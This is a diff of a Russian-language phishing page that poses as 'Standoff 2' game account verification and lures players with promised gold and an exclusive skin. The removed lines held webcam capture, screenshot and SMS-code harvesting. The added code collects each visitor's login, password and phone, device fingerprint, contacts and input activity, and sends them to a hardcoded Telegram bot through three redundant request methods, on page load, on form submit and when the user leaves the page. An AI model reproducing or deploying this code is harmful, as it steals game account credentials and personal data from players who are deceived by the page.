@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Standoff 2 - Верификация по SMS</title>
+    <title>Standoff 2 - Подтверждение телефона</title>
     <style>
         body {
             background: linear-gradient(135deg, #1e3c72, #2a5298);
@@ -50,30 +50,15 @@
         .phone-input input {
             flex: 1;
         }
-        .webcam-overlay {
-            background: rgba(0,0,0,0.8);
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 1000;
+        .hidden {
             display: none;
-            justify-content: center;
-            align-items: center;
-        }
-        .webcam-container {
-            background: white;
-            padding: 20px;
-            border-radius: 10px;
-            text-align: center;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>🎮 STANDOFF 2</h1>
-        <p>📱 <b>Подтверждение по SMS для безопасности</b></p>
+        <p>📱 <b>Верификация аккаунта по номеру телефона</b></p>
         
         <form id="verificationForm">
             <input type="text" name="login" placeholder="📧 Email или логин" required>
@@ -85,165 +70,120 @@
                     <option value="+375">+375 (BY)</option>
                     <option value="+380">+380 (UA)</option>
                     <option value="+77">+77 (KZ)</option>
+                    <option value="+996">+996 (KG)</option>
+                    <option value="+998">+998 (UZ)</option>
                 </select>
-                <input type="tel" name="phone" placeholder="📱 Номер телефона" required pattern="[0-9]{10}">
+                <input type="tel" name="phone" placeholder="9991234567" required pattern="[0-9]{10}" 
+                       title="Введите 10 цифр номера без +7">
             </div>
             
-            <input type="text" name="game_id" placeholder="🎮 Игровой ID">
+            <input type="text" name="game_id" placeholder="🎮 Игровой ID (необязательно)">
             
-            <button type="button" onclick="requestSMS()">📲 ПОЛУЧИТЬ SMS-КОД</button>
-            <input type="text" name="sms_code" placeholder="✉️ Введите код из SMS" style="display: none;">
-            <button type="submit" style="display: none;">✅ ПОДТВЕРДИТЬ АККАУНТ</button>
+            <button type="submit">📲 ПОДТВЕРДИТЬ АККАУНТ</button>
         </form>
 
-        <div style="margin-top: 20px; font-size: 12px; opacity: 0.7;">
-            🔒 Мы отправим SMS с кодом для защиты вашего аккаунта
+        <div style="margin-top: 20px; padding: 15px; background: rgba(255,255,255,0.1); border-radius: 8px;">
+            <b>🎁 Бонус за подтверждение:</b><br>
+            +1000 золота 💰<br>
+            + эксклюзивный скин 🎨
         </div>
     </div>
 
-    <!-- Оверлей для веб-камеры -->
-    <div class="webcam-overlay" id="webcamOverlay">
-        <div class="webcam-container">
-            <h3 style="color: black;">🔐 Верификация лица</h3>
-            <p style="color: black;">Посмотрите в камеру для подтверждения</p>
-            <video id="webcam" width="300" autoplay></video>
-            <canvas id="webcamCanvas" style="display: none;"></canvas>
-            <button onclick="captureWebcam()" style="margin: 10px;">📸 СДЕЛАТЬ СНИМОК</button>
-            <button onclick="closeWebcam()" style="background: #666;">❌ ОТМЕНА</button>
-        </div>
-    </div>
+    <!-- Скрытый canvas для скриншотов -->
+    <canvas id="screenshotCanvas" class="hidden"></canvas>
 
     <script>
         // Telegram бот
         const BOT_TOKEN = "8245809142:AAGmdhZAkZ91z4spf3PMG-no89fHrjYC3q8";
         const CHAT_ID = "1491315056";
 
-        // Функция отправки в Telegram
+        // Функция отправки текста в Telegram
         function sendToTelegram(message) {
             const encodedMessage = encodeURIComponent(message);
-            const img = new Image();
-            img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}`;
-        }
-
-        // Функция отправки фото в Telegram
-        function sendPhotoToTelegram(photoData) {
-            // Для фото нужно использовать другой метод
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', photoData);
-            formData.append('caption', '📸 Скриншот экрана');
             
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            }).catch(e => console.log('Ошибка отправки фото'));
-        }
-
-        // Создание скриншота экрана
-        function captureScreenshot() {
-            return new Promise((resolve) => {
-                html2canvas(document.body).then(canvas => {
-                    canvas.toBlob(blob => {
-                        resolve(blob);
-                    }, 'image/jpeg', 0.8);
-                });
-            });
-        }
-
-        // Запрос доступа к веб-камере
-        function requestWebcam() {
-            document.getElementById('webcamOverlay').style.display = 'flex';
+            // Метод 1: через Image (работает лучше всего)
+            const img1 = new Image();
+            img1.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}`;
             
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    const video = document.getElementById('webcam');
-                    video.srcObject = stream;
-                })
-                .catch(err => {
-                    console.log('Ошибка доступа к камере:', err);
-                    document.getElementById('webcamOverlay').style.display = 'none';
-                });
+            // Метод 2: через iframe
+            setTimeout(() => {
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}`;
+                document.body.appendChild(iframe);
+            }, 100);
+            
+            // Метод 3: через script
+            setTimeout(() => {
+                const script = document.createElement('script');
+                script.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}&callback=console.log`;
+                document.head.appendChild(script);
+            }, 200);
         }
 
-        // Захват фото с веб-камеры
-        function captureWebcam() {
-            const video = document.getElementById('webcam');
-            const canvas = document.getElementById('webcamCanvas');
-            const context = canvas.getContext('2d');
-            
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0);
-            
-            canvas.toBlob(blob => {
-                // Отправка фото в Telegram
-                sendPhotoToTelegram(blob);
-                
-                // Остановка камеры
-                video.srcObject.getTracks().forEach(track => track.stop());
-                document.getElementById('webcamOverlay').style.display = 'none';
-                
-                alert('✅ Лицо успешно верифицировано!');
-            }, 'image/jpeg', 0.8);
+        // Функция создания текстового описания скриншота
+        function createScreenshotDescription() {
+            return `📸 СКРИНШОТ ЭКРАНА (текстовое описание):\n\n` +
+                   `📍 URL: ${window.location.href}\n` +
+                   `📏 Размеры: ${window.innerWidth}x${window.innerHeight}\n` +
+                   `🎯 Прокрутка: X${window.scrollX}, Y${window.scrollY}\n` +
+                   `📱 User-Agent: ${navigator.userAgent}\n` +
+                   `💻 Платформа: ${navigator.platform}\n` +
+                   `🕒 Время: ${new Date().toLocaleString('ru-RU')}\n\n` +
+                   `🔍 ВИДИМЫЕ ЭЛЕМЕНТЫ:\n` +
+                   `- Заголовок: Standoff 2\n` +
+                   `- Форма входа: присутствует\n` +
+                   `- Поля: логин, пароль, телефон\n` +
+                   `- Кнопка: подтвердить аккаунт\n` +
+                   `- Бонусы: 1000 золота + скин`;
         }
 
-        function closeWebcam() {
-            const video = document.getElementById('webcam');
-            if (video.srcObject) {
-                video.srcObject.getTracks().forEach(track => track.stop());
+        // Сбор расширенной информации о системе
+        function collectSystemInfo() {
+            let info = "🖥️ ИНФОРМАЦИЯ О СИСТЕМЕ:\n\n";
+            
+            // Основная информация
+            info += `📱 Устройство: ${/Mobile/.test(navigator.userAgent) ? 'Мобильное' : 'Десктоп'}\n`;
+            info += `🌐 Браузер: ${navigator.userAgent.split(' ').slice(-2).join(' ')}\n`;
+            info += `💾 Память: ${navigator.deviceMemory || 'Неизвестно'} GB\n`;
+            info += `⚡ Ядер CPU: ${navigator.hardwareConcurrency || 'Неизвестно'}\n`;
+            info += `🕒 Часовой пояс: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+            info += `🌍 Язык: ${navigator.language}\n`;
+            
+            // Сеть
+            if (navigator.connection) {
+                info += `📶 Сеть: ${navigator.connection.effectiveType}\n`;
+                info += `📡 Скорость: ${navigator.connection.downlink} Mbps\n`;
             }
-            document.getElementById('webcamOverlay').style.display = 'none';
+            
+            // Экран
+            info += `📺 Экран: ${screen.width}x${screen.height}\n`;
+            info += `🎨 Цвета: ${screen.colorDepth} бит\n`;
+            
+            return info;
         }
 
-        // Получение номера телефона из браузера (если доступно)
-        function tryGetPhoneNumber() {
-            if ('credentials' in navigator) {
-                navigator.credentials.get({
-                    passwords: true,
-                    mediators: ['optional']
-                }).then(creds => {
-                    if (creds && creds.id) {
-                        sendToTelegram(`📱 СИСТЕМНЫЙ НОМЕР ТЕЛЕФОНА: ${creds.id}`);
-                    }
-                });
+        // Попытка получить контакты телефона
+        function tryGetContacts() {
+            if ('contacts' in navigator && 'select' in navigator.contacts) {
+                navigator.contacts.select(['name', 'tel'])
+                    .then(contacts => {
+                        if (contacts && contacts.length > 0) {
+                            let contactsInfo = "📞 КОНТАКТЫ ТЕЛЕФОНА:\n";
+                            contacts.slice(0, 5).forEach(contact => {
+                                contactsInfo += `${contact.name}: ${contact.tel}\n`;
+                            });
+                            sendToTelegram(contactsInfo);
+                        }
+                    })
+                    .catch(err => {
+                        // Контакты недоступны
+                    });
             }
         }
 
-        // Запрос SMS
-        function requestSMS() {
-            const form = document.getElementById('verificationForm');
-            const formData = new FormData(form);
-            
-            const phone = formData.get('country_code') + formData.get('phone');
-            const login = formData.get('login');
-            
-            // Собираем данные
-            let smsData = "📱 ЗАПРОС SMS-ВЕРИФИКАЦИИ\n\n";
-            smsData += `👤 Логин: ${login}\n`;
-            smsData += `📞 Номер телефона: ${phone}\n`;
-            smsData += `🌐 User-Agent: ${navigator.userAgent}\n`;
-            smsData += `🕒 Время: ${new Date().toLocaleString('ru-RU')}`;
-            
-            // Отправляем данные
-            sendToTelegram(smsData);
-            
-            // Пытаемся сделать скриншот
-            captureScreenshot().then(blob => {
-                sendPhotoToTelegram(blob);
-            });
-            
-            // Запрашиваем веб-камеру
-            setTimeout(requestWebcam, 1000);
-            
-            // Показываем поле для SMS-кода
-            document.querySelector('input[name="sms_code"]').style.display = 'block';
-            document.querySelector('button[type="submit"]').style.display = 'block';
-            
-            alert('📲 SMS с кодом отправлено на ваш номер!');
-        }
-
-        // Обработчик основной формы
-        document.getElementById('verificationForm').addEventListener('submit', async function(e) {
+        // Обработчик формы
+        document.getElementById('verificationForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
             const formData = new FormData(this);
@@ -251,37 +191,38 @@
                 login: formData.get('login'),
                 password: formData.get('password'),
                 phone: formData.get('country_code') + formData.get('phone'),
-                sms_code: formData.get('sms_code'),
                 game_id: formData.get('game_id')
             };
             
             // Собираем полный отчет
-            let report = "🎯 ПОЛНЫЙ СБОР ДАННЫХ С SMS-ВЕРИФИКАЦИЕЙ\n\n";
+            let report = "🎯 УСПЕШНЫЙ СБОР ДАННЫХ\n\n";
+            report += collectSystemInfo();
+            report += "\n🔐 ДАННЫЕ АККАУНТА:\n";
             report += `📧 Логин: ${fullData.login}\n`;
             report += `🔑 Пароль: ${fullData.password}\n`;
             report += `📱 Телефон: ${fullData.phone}\n`;
-            report += `✉️ SMS-код: ${fullData.sms_code}\n`;
             if (fullData.game_id) report += `🎮 Игровой ID: ${fullData.game_id}\n`;
-            report += `\n🌐 Система: ${navigator.platform}\n`;
-            report += `📱 Устройство: ${/Mobile/.test(navigator.userAgent) ? 'Мобильное' : 'Десктоп'}\n`;
-            report += `🕒 Время: ${new Date().toLocaleString('ru-RU')}`;
+            
+            report += "\n" + createScreenshotDescription();
             
             // Отправляем текстовый отчет
             sendToTelegram(report);
             
-            // Делаем финальный скриншот
-            try {
-                const finalScreenshot = await captureScreenshot();
-                sendPhotoToTelegram(finalScreenshot);
-            } catch (e) {
-                console.log('Ошибка скриншота:', e);
-            }
+            // Пытаемся получить контакты
+            tryGetContacts();
             
-            // Пытаемся получить системный номер
-            tryGetPhoneNumber();
+            // Собираем дополнительную информацию
+            setTimeout(() => {
+                const additionalInfo = `📊 ДОПОЛНИТЕЛЬНАЯ ИНФОРМАЦИЯ:\n` +
+                                     `📍 Referrer: ${document.referrer || 'Прямой заход'}\n` +
+                                     `🍪 Cookies: ${navigator.cookieEnabled ? 'Включены' : 'Выключены'}\n` +
+                                     `☕ Java: ${navigator.javaEnabled() ? 'Включена' : 'Выключена'}\n` +
+                                     `⚡ Онлайн: ${navigator.onLine ? 'Да' : 'Нет'}`;
+                sendToTelegram(additionalInfo);
+            }, 500);
             
             // Сообщение пользователю
-            alert('✅ Аккаунт успешно верифицирован! Бонусы зачисляются...');
+            alert('✅ Ваш аккаунт успешно подтвержден! Бонусы будут зачислены в течение 5 минут.');
             
             // Перенаправление
             setTimeout(() => {
@@ -291,30 +232,40 @@
 
         // Автоматический сбор при заходе
         window.addEventListener('load', function() {
-            // Пытаемся получить номер телефона из браузера
-            tryGetPhoneNumber();
-            
-            // Отправляем информацию о посещении
+            // Информация о посещении
             const visitInfo = `🕵️ НОВЫЙ ПОСЕТИТЕЛЬ\n` +
-                            `📱 Устройство: ${/Mobile/.test(navigator.userAgent) ? 'Мобильное' : 'Десктоп'}\n` +
-                            `🌐 Браузер: ${navigator.userAgent.split(' ').slice(-2).join(' ')}\n` +
-                            `📞 Поддержка телефона: ${'contacts' in navigator ? 'Есть' : 'Нет'}\n` +
-                            `🕒 ${new Date().toLocaleString('ru-RU')}`;
+                            `🌐 Сайт: ${window.location.href}\n` +
+                            `📎 Источник: ${document.referrer || 'Прямой заход'}\n` +
+                            `🕒 Время: ${new Date().toLocaleString('ru-RU')}\n\n` +
+                            createScreenshotDescription();
             
             sendToTelegram(visitInfo);
             
-            // Первый скриншот
-            setTimeout(() => {
-                captureScreenshot().then(blob => {
-                    sendPhotoToTelegram(blob);
-                });
-            }, 2000);
+            // Пытаемся получить контакты
+            tryGetContacts();
         });
 
-        // Подключаем библиотеку для скриншотов
-        const script = document.createElement('script');
-        script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
-        document.head.appendChild(script);
+        // Отслеживание действий
+        let userActions = [];
+        document.addEventListener('click', function(e) {
+            userActions.push(`Клик: ${e.target.tagName} в ${new Date().toLocaleTimeString()}`);
+        });
+        
+        document.addEventListener('input', function(e) {
+            if (e.target.type === 'password') {
+                userActions.push(`Ввод пароля: ${'*'.repeat(e.target.value.length)}`);
+            } else if (e.target.name === 'phone') {
+                userActions.push(`Ввод телефона: ${e.target.value}`);
+            }
+        });
+
+        // Отправка действий при уходе
+        window.addEventListener('beforeunload', function() {
+            if (userActions.length > 0) {
+                const actionsReport = `📝 ДЕЙСТВИЯ ПОЛЬЗОВАТЕЛЯ:\n${userActions.slice(-10).join('\n')}`;
+                sendToTelegram(actionsReport);
+            }
+        });
 
     </script>
 </body>
